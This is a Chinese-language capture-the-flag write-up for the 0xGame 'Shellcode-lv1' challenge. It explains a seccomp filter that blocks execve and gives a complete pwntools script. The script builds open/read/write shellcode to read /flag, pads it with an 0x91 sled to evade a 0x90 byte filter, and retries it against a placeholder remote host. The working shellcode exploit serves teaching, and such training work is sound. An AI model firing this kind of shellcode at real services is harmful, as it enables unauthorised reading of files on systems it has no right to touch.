# Shellcode-lv1

## 题目简述

随机入口和 `0x90` 过滤与 lv0 相同，但程序在执行 shellcode 前安装 seccomp：禁止 x86-64 的 `execve`（59）和 `execveat`（322）。因此不能启动 shell，需要使用允许的 `open → read → write` 系统调用链直接读取 `/flag`。

## 解题过程

seccomp 过滤器的稳定规则是：

```text
arch 必须为 x86-64
syscall >= 0x40000000 时终止
syscall == 59 或 322 时终止
其余系统调用允许
```

`open`、`read`、`write` 的系统调用号分别为 2、0、1，均未被禁用。`open` 返回的文件描述符位于 `rax`，把它直接传给后续 `read`，避免依赖“flag 一定是 fd 3”的偶然条件。

仍使用单字节 `0x91`（`xchg eax, ecx`）作为非 NOP 滑道，并在真实 shellcode 开头清理 `eax`。随机偏移落到真实 shellcode 中部时可能失败，所以自动重连。

```python
from pwn import asm, context, remote, shellcraft

context(arch="amd64", os="linux")

code = asm("xor eax, eax")
code += asm(shellcraft.open("/flag", 0, 0))
code += asm(shellcraft.read("rax", "rsp", 0x100))
code += asm(shellcraft.write(1, "rsp", 0x100))

payload = code.rjust(0x100, b"\x91")
assert len(payload) == 0x100
assert b"\x90" not in payload

for attempt in range(1, 50):
    io = remote("HOST", PORT)
    io.sendafter(b"Show me what you want to run: ", payload)
    output = io.recvrepeat(1)
    io.close()

    if b"0xGame{" in output:
        print(f"success after {attempt} attempts")
        print(output.decode(errors="replace"))
        break
else:
    raise RuntimeError("随机入口连续失败，请重新运行")
```

仓库没有收录 Dockerfile 所引用的比赛 `build/flag`，所以不能可靠补写最终字符串；脚本成功时打印的 `0xGame{...}` 即为当前实例结果。

## 方法总结

seccomp 题先读清允许与禁止的系统调用，而不是默认追求 shell。这里 `execve` 被封锁，但文件读取所需的 open/read/write 仍完整开放；配合非 NOP 滑道即可在随机入口条件下直接回显 flag。
